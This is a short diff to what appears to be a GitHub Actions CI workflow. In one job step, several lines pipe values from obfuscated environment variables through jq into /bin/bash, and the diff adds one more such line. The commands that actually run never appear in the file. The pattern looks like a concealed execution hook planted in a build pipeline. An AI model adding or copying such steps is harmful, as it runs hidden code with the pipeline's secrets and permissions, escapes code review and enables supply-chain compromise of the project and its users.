@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$h09" | jq -r .sa21147 | /bin/bash
           echo $gz09754 | jq -r .s53 | /bin/bash
           printf '%s' "$v83235" | jq -r .fc7778 | /bin/bash
+          printf '%s' "$lvpi2" | jq -r .zx1903 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
